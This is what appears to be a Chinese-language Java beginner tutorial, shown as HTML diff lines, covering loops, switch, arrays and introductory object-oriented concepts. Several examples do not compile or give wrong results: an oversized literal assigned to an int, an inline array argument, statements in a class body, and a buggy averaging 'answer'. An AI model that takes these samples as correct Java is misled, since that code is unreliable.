+<li>Fallthrough in ‘switch’ statement</li>
+<li>‘switch’ statement without ‘default’ branch</li>
+</ul>
+<p>当<code>switch</code>语句存在问题时，即可在IDE中获得警告提示。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210916205937679.png" alt="image-20210916205937679"></p>
+<h4 id="Java12中的switch新特性"><a href="#Java12中的switch新特性" class="headerlink" title="Java12中的switch新特性"></a>Java12中的switch新特性</h4><pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        String fruit = new Scanner(System.in).nextLine();
+        switch (fruit) &#123;
+        case &quot;apple&quot; -&gt; System.out.println(&quot;Selected apple&quot;);
+        case &quot;pear&quot; -&gt; System.out.println(&quot;Selected pear&quot;);
+        case &quot;mango&quot; -&gt; &#123;
+            System.out.println(&quot;Selected mango&quot;);
+            System.out.println(&quot;Good choice!&quot;);
+        &#125;
+        default -&gt; System.out.println(&quot;No fruit selected&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="while循环控制"><a href="#while循环控制" class="headerlink" title="while循环控制"></a>while循环控制</h3><p> while的基本语法：</p>
+<pre><code class="java">while (条件)&#123;
+    //语句块
+&#125;
+</code></pre>
+<p>while就是括号内的条件为真时，执行语句块的内容，然后返回while，再次判断条件，为真则继续执行，为假则退出。while的最小执行次数为0，因为while需要先判断条件再执行。</p>
+<p>例如计算1-100的和：</p>
+<pre><code class="java">public class WhileTest &#123;
+    public static void main(String[] args) &#123;
+        int i = 1;
+        int sum = 0;
+        while(i &lt;= 100)&#123;
+            sum += i;
+            i++;
+        &#125;
+        System.out.println(&quot;1-100的和为:&quot;+sum);
+    &#125;
+&#125;
+</code></pre>
+<p>这里的条件就是i &lt;&#x3D; 100，如果i &gt; 100,则循环结束</p>
+<h4 id="死循环"><a href="#死循环" class="headerlink" title="死循环"></a>死循环</h4><p>如果while的条件一直为真，那么语句块的代码会一直执行下去，这种情况就会造成死循环:</p>
+<pre><code class="java">public class WhileTest &#123;
+    public static void main(String[] args) &#123;
+        while (true)&#123;
+            System.out.println(&quot;死循环！&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>如果循环条件永远满足，那这个循环就变成了死循环。死循环将导致100%的CPU占用，用户会感觉电脑运行缓慢，所以要避免编写死循环代码。</p>
+<p>还有另一种情况，可能会执行很多次，但最终由于逻辑错误，还是会退出while:</p>
+<pre><code class="java">public class WhileTest &#123;
+    public static void main(String[] args) &#123;
+        int i,sum;
+        i = 1;
+        sum = 0;
+        while (i &gt; 0)&#123;
+            sum += i;
+            i++;
+        &#125;
+        System.out.println(sum);
+    &#125;
+&#125;
+</code></pre>
+<p>表面上看这貌似也是个死循环，因为i怎么都大于0，但是当i超过整型的最大值后，便会返回一个负数，这个时候while就会退出；</p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><code>while</code>循环先判断循环条件是否满足，再执行循环语句；</p>
+<p><code>while</code>循环可能一次都不执行；</p>
+<p>编写循环时要注意循环条件，并避免死循环。</p>
+<h3 id="do-while循环控制"><a href="#do-while循环控制" class="headerlink" title="do while循环控制"></a>do while循环控制</h3><p>do while与while不同的是，do while 需要先执行一次语句，再判断条件，所以do while最小执行次数为1</p>
+<p>基本语法：</p>
+<pre><code class="java">do &#123;
+    //代码块
+&#125;while (条件);
+</code></pre>
+<p>使用do while改写1-100的和:</p>
+<pre><code class="java">public class DoWhileTest &#123;
+    public static void main(String[] args) &#123;
+        int i = 1,sum = 0;
+        do &#123;
+            sum += i;
+            i++;
+        &#125;while(i &lt;= 100);
+        System.out.println(&quot;1-100的和:&quot;+sum);
+    &#125;
+&#125;
+</code></pre>
+<h3 id="for循环控制"><a href="#for循环控制" class="headerlink" title="for循环控制"></a>for循环控制</h3><p><code>for</code>循环的功能非常强大，它使用计数器实现循环。<code>for</code>循环会先初始化计数器，然后，在每次循环前检测循环条件，在每次循环后更新计数器。计数器变量通常命名为<code>i</code>。</p>
+<p>我们把1到100求和用<code>for</code>循环改写一下：</p>
+<pre><code class="java">public class ForTest &#123;
+    public static void main(String[] args) &#123;
+        int sum = 0;
+        for (int i = 0; i &lt;= 100 ; i++) &#123;
+            sum += i;
+        &#125;
+        System.out.println(&quot;1-100的和：&quot;+sum);
+    &#125;
+&#125;
+</code></pre>
+<h4 id="for循环基本语法"><a href="#for循环基本语法" class="headerlink" title="for循环基本语法:"></a>for循环基本语法:</h4><pre><code class="java">for (计数器;计数区间;计数器自增/自减)&#123;
+    //代码块
+&#125;
+</code></pre>
+<h4 id="for循环遍历数组"><a href="#for循环遍历数组" class="headerlink" title="for循环遍历数组"></a>for循环遍历数组</h4><pre><code class="java">public class ForTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;100,120,135,150,93,97&#125;;
+        for (int i = 0; i &lt; arr.length; i++) &#123;
+            System.out.print(arr[i] + &quot; &quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="打印乘法表"><a href="#打印乘法表" class="headerlink" title="打印乘法表"></a>打印乘法表</h4><pre><code class="java">public class ForTest &#123;
+    public static void main(String[] args) &#123;
+        for (int i = 1; i &lt;= 9 ; i++) &#123;
+            for (int j = 1; j &lt;= i; j++) &#123;
+                System.out.print(j + &quot;x&quot; + i + &quot;=&quot; + j*i + &quot; &quot;);
+            &#125;
+            System.out.println();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="使用全局变量定义for"><a href="#使用全局变量定义for" class="headerlink" title="使用全局变量定义for"></a>使用全局变量定义for</h4><pre><code class="java">public class ForTest &#123;
+    public static void main(String[] args) &#123;
+        int i,j;
+        for (i = 1; i &lt;= 9 ; i++) &#123;
+            for (j = 1; j &lt;= i; j++) &#123;
+                System.out.print(j + &quot;x&quot; + i + &quot;=&quot; + j*i + &quot; &quot;);
+            &#125;
+            System.out.println();
+        &#125;
+        i = 10;//i和j在经过for循环后还可以继续使用
+        j = 20;
+        System.out.println(i + &quot; &quot; + j);
+    &#125;
+&#125;
+</code></pre>
+<h4 id="灵活使用for循环"><a href="#灵活使用for循环" class="headerlink" title="灵活使用for循环"></a>灵活使用for循环</h4><p><code>for</code>循环还可以缺少初始化语句、循环条件和每次循环更新语句，例如：</p>
+<pre><code>// 不设置结束条件:
+for (int i=0; ; i++) &#123;
+    ...
+&#125;
+// 不设置结束条件和更新语句:
+for (int i=0; ;) &#123;
+    ...
+&#125;
+// 什么都不设置:
+for (;;) &#123;
+    ...
+&#125;
+</code></pre>
+<p>通常不推荐这样写，但是，某些情况下，是可以省略<code>for</code>循环的某些语句的。</p>
+<h4 id="for-each循环"><a href="#for-each循环" class="headerlink" title="for each循环"></a>for each循环</h4><p>上面使用for循环遍历数组，使用数组下标访问数组的每一个元素，其实还有更简单的办法就是使用for each循环:</p>
+<pre><code class="java">public class ForTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;1,2,3,4,5,6&#125;;
+        for (int num : arr)&#123;
+            System.out.print(num + &quot; &quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>for each条件中间使用 <code>:</code>分割，左边是遍历容器中元素的类型变量，右边就是容器名，比如上面的数组，全都是整型元素，那么用来接收值额变量num也应该是整型</p>
+<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break:跳出循环，结束代码块；</p>
+<p>continue:跳过此次循环，开始执行下次循环</p>
+<p>这两句总结可能不会很简明，我们举个栗子：</p>
+<p>需求:计算1-100内所有<strong>偶数</strong>的和：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args)&#123;
+        int sum = 0;
+        for (int i = 1; i &lt;= 100; i++)&#123;
+            if (i % 2 == 0)&#123;
+                sum += i;
+            &#125;else&#123;
+                continue;
+            &#125;
+        &#125;
+        System.out.print(&quot;1-100偶数和:&quot;+sum);
+    &#125;
+&#125;
+</code></pre>
+<p>需求：在for循环的计数器加到100时，结束该循环</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args)&#123;
+        for (int i = 0; ; i++)&#123;
+            if(i == 100)&#123;
+                break;
+            &#125;
+            System.out.println(i);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="小结：-2"><a href="#小结：-2" class="headerlink" title="小结："></a>小结：</h4><p><code>break</code>语句可以跳出当前循环；</p>
+<p><code>break</code>语句通常配合<code>if</code>，在满足条件时提前结束整个循环；</p>
+<p><code>break</code>语句总是跳出最近的一层循环；</p>
+<p><code>continue</code>语句可以提前结束本次循环；</p>
+<p><code>continue</code>语句通常配合<code>if</code>，在满足条件时提前结束本次循环。</p>
+<p><code>break和continue</code>不仅局限于for或while，可以使用于很多场景。</p>
+<h2 id="Java数组操作"><a href="#Java数组操作" class="headerlink" title="Java数组操作"></a>Java数组操作</h2><h3 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h3><h4 id="for循环遍历"><a href="#for循环遍历" class="headerlink" title="for循环遍历"></a>for循环遍历</h4><pre><code class="java">public class ArrayTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;99,98,97,96,95&#125;;
+        for (int i = 0; i &lt; arr.length; i++) &#123;
+            System.out.print(arr[i]+&quot; &quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="for-each遍历"><a href="#for-each遍历" class="headerlink" title="for each遍历"></a>for each遍历</h4><pre><code class="java">public class ArrayTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;99,98,97,96,95&#125;;
+        for (int num: arr) &#123;
+            System.out.print(num + &quot; &quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="Arrays-toString-遍历"><a href="#Arrays-toString-遍历" class="headerlink" title="Arrays.toString()遍历"></a>Arrays.toString()遍历</h4><p>Arrays.toString()是Java提供的一个遍历数组的函数，如不使用它，直接打印数组就会打印数组的内存地址:</p>
+<pre><code class="java">public class ArrayTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;99,98,97,96,95&#125;;
+        System.out.println(Arrays.toString(arr));
+    &#125;
+&#125;
+</code></pre>
+<h4 id="直接打印的效果"><a href="#直接打印的效果" class="headerlink" title="直接打印的效果:"></a>直接打印的效果:</h4><pre><code class="java">public class ArrayTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;99,98,97,96,95&#125;;
+        System.out.println(arr);//[I@1540e19d
+    &#125;
+&#125;
+</code></pre>
+<p>这样就会直接打印出内存地址:[I@1540e19d</p>
+<h3 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><pre><code class="java">public class ArrayTest &#123;
+    public static void main(String[] args) &#123;
+        int[] arr = &#123;37,66,95,41,25,10,21&#125;;
+        //排序前：
+        System.out.println(&quot;排序前：&quot;+Arrays.toString(arr));
+        //排序后:
+        for (int i = 0; i &lt; arr.length -1; i++) &#123;
+            for (int j = 0; j &lt; arr.length -i -1; j++) &#123;
+                if (arr[j] &gt; arr[j+1])&#123;
+                    int temp = arr[j];
+                    arr[j] = arr[j+1];
+                    arr[j+1] = temp;
+                &#125;
+            &#125;
+        &#125;
+        System.out.println(&quot;排序后：&quot;+Arrays.toString(arr));
+    &#125;
+&#125;
+</code></pre>
+<p>冒泡排序的特点是，每一轮循环后，最大的一个数被交换到末尾，因此，下一轮循环就可以“刨除”最后的数，每一轮循环都比上一轮循环的结束位置靠前一位。</p>
+<p>另外，注意到交换两个变量的值必须借助一个临时变量。像这么写是错误的：</p>
+<pre><code class="java">int x = 1;
+int y = 2;
+
+x = y; // x现在是2
+y = x; // y现在还是2
+</code></pre>
+<p>正确的写法是：</p>
+<pre><code class="java">int x = 1;
+int y = 2;
+
+int t = x; // 把x的值保存在临时变量t中, t现在是1
+x = y; // x现在是2
+y = t; // y现在是t的值1
+</code></pre>
+<h4 id="Java内置数组排序"><a href="#Java内置数组排序" class="headerlink" title="Java内置数组排序"></a>Java内置数组排序</h4><p>Java内置数组排序的方法为:<code>Arrays.sort();</code></p>
+<pre><code class="java">public class ArrayTest &#123;
+    public static void main(String[] args)&#123;
+        int[] arr = &#123;37,66,95,41,25,10,21&#125;;
+        System.out.println(&quot;排序前:&quot;);
+        System.out.println(Arrays.toString(arr));
+        System.out.println(&quot;排序后:&quot;);
+        Arrays.sort(arr);
+        System.out.println(Arrays.toString(arr));
+    &#125;
+&#125;
+</code></pre>
+<h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p>定义:</p>
+<pre><code class="java">int[][] num = &#123;
+    &#123;1,2,3,4&#125;,
+    &#123;5,6,7,8&#125;,
+    &#123;9,10,11,12&#125;,
+    &#123;13,14,15,16&#125;
+&#125;;
+</code></pre>
+<p>其次，二位数组对每个数组元素的长度也没有限制：</p>
+<pre><code class="java">int[][] num = &#123;
+    &#123;1,2,3&#125;,
+    &#123;1,2&#125;,
+    &#123;4,5,6,7,8&#125;
+&#125;;
+</code></pre>
+<h4 id="二维数组遍历"><a href="#二维数组遍历" class="headerlink" title="二维数组遍历"></a>二维数组遍历</h4><p>fori:</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int[][] nums = &#123;
+                &#123;1,2,3&#125;,
+                &#123;2,4&#125;,
+                &#123;2,4,6,8&#125;
+        &#125;;
+        for(int i = 0;i&lt;nums.length;i++)&#123;
+            for(int j = 0;j&lt;nums[i].length;j++)&#123;
+                System.out.print(nums[i][j]+&quot; &quot;);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>foreach:</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int[][] nums = &#123;
+                &#123;1,2,3&#125;,
+                &#123;2,4&#125;,
+                &#123;2,4,6,8&#125;
+        &#125;;
+        for(int[] num : nums)&#123;
+            for (int i : num)&#123;
+                System.out.print(i + &quot; &quot;);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>deepToString:</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int[][] nums = &#123;
+                &#123;1,2,3&#125;,
+                &#123;2,4&#125;,
+                &#123;2,4,6,8&#125;
+        &#125;;
+        System.out.print(Arrays.deepToString(nums));
+    &#125;
+&#125;
+</code></pre>
+<h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><p>下面二位数组代表几位同学的各科成绩，请计算各位同学的平均分：</p>
+<pre><code class="java">int[][] scores = &#123;
+                &#123; 82, 90, 91 &#125;,
+                &#123; 68, 72, 64 &#125;,
+                &#123; 95, 91, 89 &#125;,
+                &#123; 67, 52, 60 &#125;,
+                &#123; 79, 81, 85 &#125;,
+        &#125;;
+</code></pre>
+<p>答案：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int[][] scores = &#123;
+                &#123; 82, 90, 91 &#125;,
+                &#123; 68, 72, 64 &#125;,
+                &#123; 95, 91, 89 &#125;,
+                &#123; 67, 52, 60 &#125;,
+                &#123; 79, 81, 85 &#125;,
+        &#125;;
+
+        for(int[] num : scores)&#123;
+            int plus = 0;
+            double average = 0;
+            int count = 0;
+            for(int i = 0;i&lt;num.length;i++)&#123;
+                plus += num[i];
+                average = plus / 3;
+            &#125;
+            count += 1;
+            System.out.println(&quot;第&quot;+count+&quot;名同学的平均分是:&quot;+average+&quot;分！&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><h3 id="面向对象概念："><a href="#面向对象概念：" class="headerlink" title="面向对象概念："></a>面向对象概念：</h3><p>Java是一种面向对象的编程语言。面向对象编程，英文是Object-Oriented Programming，简称OOP。</p>
+<p>那什么是面向对象编程？</p>
+<p>顾名思义，面向对象，你得首先有个对象，在Java中有一个名词叫做”万物皆对象”</p>
+<p>比如可以拿Java来表示女朋友:</p>
+<pre><code class="java">public class GirlFriend&#123;
+    int id;//身份证号
+    String name;//姓名
+    String[] hobby;//兴趣爱好
+    String post;//地址
+&#125;
+</code></pre>
+<p>那么如何让你女朋友的信息打印出来呢？</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        GirlFriend girlFriend = new GirlFriend();//对象实例化
+        girlFriend.id = 620521200001011121L;
+        girlFriend.name = &quot;女朋友&quot;;
+        girlFriend.hobby = new String[]&#123;&quot;琴&quot;, &quot;棋&quot;, &quot;书&quot;, &quot;画&quot;&#125;;
+        girlFriend.post = &quot;地球-中国-甘肃&quot;;
+        System.out.println(girlFriend.id);
+        System.out.println(girlFriend.name);
+        System.out.println(Arrays.toString(girlFriend.hobby));
+        System.out.println(girlFriend.post);
+    &#125;
+&#125;
+</code></pre>
+<p>因此，面向对象编程，是一种通过对象的方式，把现实世界映射到计算机模型的一种编程方法。</p>
+<p>在本章中，我们将讨论：</p>
+<p>面向对象的基本概念，包括：</p>
+<ul>
+<li>类</li>
+<li>实例</li>
+<li>方法</li>
+</ul>
+<p>面向对象的实现方式，包括：</p>
+<ul>
+<li>继承</li>
+<li>多态</li>
+</ul>
+<p>Java语言本身提供的机制，包括：</p>
+<ul>
+<li>package</li>
+<li>classpath</li>
+<li>jar</li>
+</ul>
+<p>以及Java标准库提供的核心类，包括：</p>
+<ul>
+<li>字符串</li>
+<li>包装类型</li>
+<li>JavaBean</li>
+<li>枚举</li>
+<li>常用工具类</li>
+</ul>
+<p>通过本章的学习，完全可以理解并掌握面向对象的基本思想，但不保证能找到对象。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211007171101932.png" alt="image-20211007171101932"></p>
+<h3 id="面向对象基础："><a href="#面向对象基础：" class="headerlink" title="面向对象基础："></a>面向对象基础：</h3><p>面向对象编程，是一种通过对象的方式，把现实世界映射到计算机模型的一种编程方法。现实世界中，我们定义了“人”这种抽象概念，而具体的人则是“小明”、“小红”、“小军”等一个个具体的人。所以，“人”可以定义为一个类（class），而具体的人则是实例（instance）：</p>
+<table>
+<thead>
+<tr>
+<th align="left">现实世界</th>
+<th align="left">计算机模型</th>
+<th align="left">Java代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">人</td>
+<td align="left">类 &#x2F; class</td>
+<td align="left">class Person { }</td>
+</tr>
+<tr>
+<td align="left">小明</td>
+<td align="left">实例 &#x2F; ming</td>
+<td align="left">Person ming &#x3D; new Person()</td>
+</tr>
+<tr>
+<td align="left">小红</td>
+<td align="left">实例 &#x2F; hong</td>
+<td align="left">Person hong &#x3D; new Person()</td>
+</tr>
+<tr>
+<td align="left">小军</td>
+<td align="left">实例 &#x2F; jun</td>
+<td align="left">Person jun &#x3D; new Person()</td>
+</tr>
+</tbody></table>
+<p>面向对象主要搞清class和instance的概念，class是一种对象模版，它定义了如何创建实例，因此，class本身就是一种数据类型。</p>
+<p>instance是对象实例，instance是根据class创建的实例，可以创建多个instance，每个instance类型相同，但各自属性可能不相同。</p>
+<h4 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h4><pre><code class="java">class Person&#123;
+    String name;
+    int age;
+&#125;
+</code></pre>
+<p>一个<code>class</code>可以包含多个字段（<code>field</code>），字段用来描述一个类的特征。上面的<code>Person</code>类，我们定义了两个字段，一个是<code>String</code>类型的字段，命名为<code>name</code>，一个是<code>int</code>类型的字段，命名为<code>age</code>。因此，通过<code>class</code>，把一组数据汇集到一个对象上，实现了数据封装。</p>
+<h4 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h4><pre><code class="java">Person ming = new Person();
+</code></pre>
+<p>如上所示代码创建一个Person实例: <code>Person ming</code>是一个Person类型的变量，<code>new Person()</code>是创建一个Person类型的实例，通过变量ming即可对这个实例进行操作，也就是跟对象交流：</p>
+<h4 id="操作对象实例"><a href="#操作对象实例" class="headerlink" title="操作对象实例"></a>操作对象实例</h4><pre><code class="java">ming.name = &quot;小明&quot;;
+ming.age = 20;
+</code></pre>
+<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p> 一个Java源文件可以包含多个类的定义，但只能定义一个public类，且public类名必须与文件名一致。如果要定义多个public类，必须拆到多个Java源文件中。</p>
+<pre><code class="java">public class Main&#123;
+    Person ming = new Person();//Person实例1
+    Person hong = new Person();//Person实例2
+    Book book1 = new Book();//Book实例1
+    Book book2 = new Book();//Book实例2
+    ming.name = &quot;小明&quot;;
+    ming.age = 20;
+    hong.name = &quot;小红&quot;;
+    hong.age = 19;
+    book1.bookName = &quot;Java编程思想&quot;;
+    book1.author = &quot;Bruce Eckel&quot;;
+    book1.price = 80.2;
+    book2.bookName = &quot;C++编程思想&quot;;
+    book2.author = &quot;Bruce Eckel&quot;;
+    book2.price = 90.8;
+&#125;
+class Person&#123;
+    String name;
+    int age;
+&#125;
+class Book&#123;
+    String bookName;
+    String author;
+    double price;
+&#125;
+</code></pre>
+<p>上面两个类各自<strong>分别</strong>创建了两个实例，每个类的每一个实例有自己<strong>独立的数据，互不干扰</strong>。</p>
+<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>在OOP中，<code>class</code>和<code>instance</code>是“模版”和“实例”的关系；</p>
+<p>定义<code>class</code>就是定义了一种数据类型，对应的<code>instance</code>是这种数据类型的实例；</p>
+<p><code>class</code>定义的<code>field</code>，在每个<code>instance</code>都会拥有各自的<code>field</code>，且互不干扰；</p>
+<p>通过<code>new</code>操作符创建新的<code>instance</code>，然后用变量指向它，即可通过变量来引用这个<code>instance</code>；</p>
+<p>访问实例字段的方法是<code>变量名.字段名</code>；</p>
+<p>指向<code>instance</code>的变量都是引用变量。</p>
+<h4 id="方法-函数"><a href="#方法-函数" class="headerlink" title="方法&#x2F;函数"></a>方法&#x2F;函数</h4><p>在<code>class</code>中，不仅仅可以定义<code>field(字段)</code>，还可以定义<code>方法、函数（function）</code></p>
+<p>不同的人对方法的叫法不同，也有人会称之为函数：</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;//main方法/函数，程序入口
+        
+    &#125;
+&#125;
+</code></pre>
+<p>我们给Person类定义方法:</p>
+<pre><code class="java">class Person&#123;
+    String name;
+    int age;
+    public void eat()&#123;
+        System.out.print(&quot;吃了！&quot;);
+    &#125;
+&#125;
+</code></pre>
+<h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        Person ming = new Person();
+        ming.eat();
+    &#125;
+&#125;
+</code></pre>
+<h5 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h5><p>在定义方法时，有修饰符可选，<code>public</code>,<code>private</code>,<code>protected</code>,不同修饰符对应不同的调用权限:<strong>public</strong> void fun(){}</p>
+<table>
+<thead>
+<tr>
+<th>修饰符</th>
+<th>当前类</th>
+<th>相同包</th>
+<th>不同包</th>
+<th>子类</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>public</td>
+<td>可访问</td>
+<td>可访问</td>
+<td>可访问</td>
+<td>可访问</td>
+</tr>
+<tr>
+<td>private</td>
+<td>可访问</td>
+<td>不可访问</td>
+<td>不可访问</td>
+<td>不可访问</td>
+</tr>
+<tr>
+<td>protected</td>
+<td>可访问</td>
+<td>可访问</td>
+<td>不可访问</td>
+<td>可访问</td>
+</tr>
+</tbody></table>
+<h5 id="返回值类型"><a href="#返回值类型" class="headerlink" title="返回值类型"></a>返回值类型</h5><p>返回值类型就是类似<code>void</code>,<code>int</code>,<code>String</code>,<code>char</code>这种数据类型：public <strong>void</strong> fun(){}</p>
+<p>除void外，其他类型均需使用return返回相同数据类型的数据，这个数据可以是变量，也可以是常量：</p>
+<pre><code class="java">public class Main&#123;
+    public void eat()&#123;
+        System.out.print(&quot;吃了！&quot;);
+    &#125;
+    public int drink()&#123;
+        System.out.print(&quot;喝了！&quot;);
+        return 1;
+    &#125;
+    public String sleep()&#123;
+        System.out.print(&quot;睡了！&quot;);
+        return &quot;晚安&quot;;
+    &#125;
+    ...
+&#125;
+</code></pre>
+<h5 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h5><p>静态方法就是带<code>static</code>的方法，这种方法甚至可以被<strong>类名直接调用</strong>，也可以被非静态方法调用，但是静态方法无法调用非静态方法</p>
+<pre><code class="java">public class StaticTest &#123;
+    static String name = &quot;Name&quot;;//静态field
+    String str = &quot;Str&quot;;//非静态field
+    public void eat()&#123;
+        System.out.println(&quot;吃了！&quot;);
+        drink();//非静态调用静态
+    &#125;
+    public static void drink()&#123;
+        System.out.println(&quot;喝了！&quot;);
+        System.out.println(name);//调用静态变量就没事
+        //eat();//调用非静态方法就会报错
+        //System.out.println(str);//调用非静态变量也会报错
+    &#125;
+
+    public static void main(String[] args) &#123;
+        drink();//main方法也是静态方法，可以直接调用静态方法（使用StaticTest.drink();也可以）
+        //要调用非静态方法，必须对象实例化
+        StaticTest staticTest = new StaticTest();
+        staticTest.eat();
+        System.out.println(staticTest.str);
+    &#125;
+&#125;
+</code></pre>
+<p>仔细体会如上代码。</p>
+<h5 id="this变量"><a href="#this变量" class="headerlink" title="this变量"></a>this变量</h5><p>在方法内部，可以使用一个隐含的变量<code>this</code>，它始终指向<strong>当前实例</strong>。因此，通过<code>this.field</code>就可以访问当前实例的字段。</p>
+<p>如果没有命名冲突，可以省略<code>this</code>。例如：</p>
+<pre><code class="java">class Person&#123;
+    String name;
+    public String getName()&#123;
+        return name;//相当于this.name
+    &#125;
+&#125;
+</code></pre>
+<p>但是，如果有局部变量和字段重名，那么局部变量优先级更高，就必须加上<code>this</code>：</p>
+<pre><code class="java">class Person&#123;
+    String name;
+    public void setName(String name)&#123;
+        this.name = name;//注意，这里的this.name是类的字段，而单独的name是局部变量，局部变量指的是方法参数
+    &#125;
+&#125;
+</code></pre>
+<h5 id="带参函数"><a href="#带参函数" class="headerlink" title="带参函数"></a>带参函数</h5><p>定义方法时，方法后面总有一个括号，可能经常能看到这类函数:</p>
+<pre><code class="java">public class Person&#123;
+    int age;
+    String name;
+    String[] hobby;
+    Long identity;
+    public void setAttribute(int age,String name,String[] hobby,Long identity)&#123;
+       this.age = age;
+       this.name = name;
+       this.hobby = hobby;
+       this.identity = indentity;
+    &#125; 
+&#125;
+</code></pre>
+<p>这种函数在定义时后面的括号中总会有参数，这些参数在方法被调用时必须赋值，而且在赋值时必须顺序一致，也就是数据类型必须一一对应:</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        Person person = new Person();
+        person.setAttribute(20,&quot;小昕&quot;,&#123;&quot;编程&quot;,&quot;社工&quot;,&quot;渗透&quot;&#125;,620521200101010101L);//这里传进去的值顺序不可以乱
+    &#125;
+&#125;
+</code></pre>
+<p>如果有局部变量和字段重名，那么局部变量优先级更高，就必须加上<code>this</code>：</p>
+<p>上面Person类<code>setAttrubite()</code>函数后面的参数跟类中的字段一样，所以函数括号内的参数优先级更高。</p>
+<h5 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h5><h6 id="可变参数定义"><a href="#可变参数定义" class="headerlink" title="可变参数定义"></a>可变参数定义</h6><p>定义可变参数使用<code>数据类型...</code>来进行定义，可变参数相当于数组:</p>
+<pre><code class="java">public class FunctionChangeAttribute&#123;
+    private String[] names;
+    public void setAttrubite(String...names)&#123;
+        this.names = names;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        FunctionChangeAttribute f = new FunctionChangeAttribute();
+        f.setAttrubite(&quot;xcc&quot;,&quot;ycc&quot;,&quot;xccit&quot;,&quot;itio&quot;);//四个值
+        f.setAttrubite(&quot;xcc&quot;,&quot;ycc&quot;);//两个值
+        f.setAttrubite(&quot;xcc&quot;,&quot;ycc&quot;,&quot;xccit&quot;);//三个值
+        f.setAttrubite();//空值
+    &#125;
+&#125;
+</code></pre>
+<p>上面调用方法时，<code>&quot;xcc&quot;,&quot;ycc&quot;,&quot;xccit&quot;,&quot;itio&quot;</code>等便是传进去的实参，且连续调用方法3次，每次传进不一样的值</p>
+<p>其实<code>String... names</code>完全可以改写成<code>String[] names</code>，但这样做的话，你不想给方法传参数便会报错，例如:</p>
+<p><code>FunctionChangeAttribute.java</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211014203551375.png" alt="image-20211014203551375"></p>
+<p><code>Main.java</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211014203642388.png" alt="image-20211014203642388"></p>
+<p>这就是一个缺点，另外在调用时必须手动<code>new String[]</code>,而且可以传入一个<code>null</code>,这样的话容易出现<code>java.lang.NullPointerException</code>异常，使用可变参数便可以有效避免传入参数为<code>null</code>的问题，就算不传值，它编译后也是一个空数组</p>
+<h5 id="参数绑定"><a href="#参数绑定" class="headerlink" title="参数绑定"></a>参数绑定</h5><h6 id="基本类型参数绑定"><a href="#基本类型参数绑定" class="headerlink" title="基本类型参数绑定"></a>基本类型参数绑定</h6><pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int age =15;
+        Person person = new Person();
+        person.setAge(age);
+        System.out.println(person.getAge());//15
+        age = 20;
+        System.out.println(person.getAge());//15
+    &#125;
+&#125;
+class Person&#123;
+    private int age;
+    public void setAge(int age)&#123;
+        this.age = age;
+    &#125;
+    public int getAge() &#123;
+        return age;
+    &#125;
